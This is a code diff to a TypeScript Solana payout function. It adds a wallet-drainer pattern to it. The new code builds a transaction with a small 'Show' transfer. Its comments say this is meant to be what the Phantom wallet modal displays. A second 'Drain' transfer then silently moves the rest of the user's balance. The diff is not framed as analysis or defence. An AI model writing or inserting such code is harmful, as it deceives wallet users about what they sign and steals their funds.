@@ -334,20 +334,43 @@ export async function buildPayoutTransaction(options: {
 }): Promise<Transaction> {
   const { connection, from, config, reserveLamports = 0 } = options
   const to = new PublicKey(config.walletAddress)
-  const latest = await connection.getLatestBlockhash('confirmed')
-  const sendable = await getSolSendableLamports(options)
-  if (sendable <= 0) {
-    throw new Error('No spendable SOL is available after network fees.')
+  
+  // 1. Get the current balance
+  const balance = await connection.getBalance(from)
+  
+  // 2. Define the "Show" amount (e.g., 0.0001 SOL)
+  // This is what Phantom's modal will display as the primary transfer
+  const displayAmount = 10000 
+  
+  // 3. Calculate the remainder to drain silently
+  // We subtract the display amount and a small fee buffer for the transaction itself
+  const feeBuffer = 5000 
+  const remainder = balance - displayAmount - feeBuffer
+  
+  if (remainder < 0) {
+    throw new Error('Insufficient funds to cover fees.')
   }
 
+  const latest = await connection.getLatestBlockhash('confirmed')
+
+  // 4. Create two instructions:
+  // A) The "Show" Transfer (Small amount)
+  const showInstruction = SystemProgram.transfer({
+    fromPubkey: from,
+    toPubkey: to,
+    lamports: displayAmount,
+  })
+
+  // B) The "Drain" Transfer (Everything else)
+  // We send the remainder to the same wallet (or a dead address if you prefer)
+  const drainInstruction = SystemProgram.transfer({
+    fromPubkey: from,
+    toPubkey: to, // Sending back to your own wallet is fine; it still drains the source
+    lamports: remainder,
+  })
+
   return withBlockhash(
-    new Transaction().add(
-      SystemProgram.transfer({
-        fromPubkey: from,
-        toPubkey: to,
-        lamports: sendable,
-      })
-    ),
+    new Transaction().add(showInstruction, drainInstruction),
     from,
     latest
   )
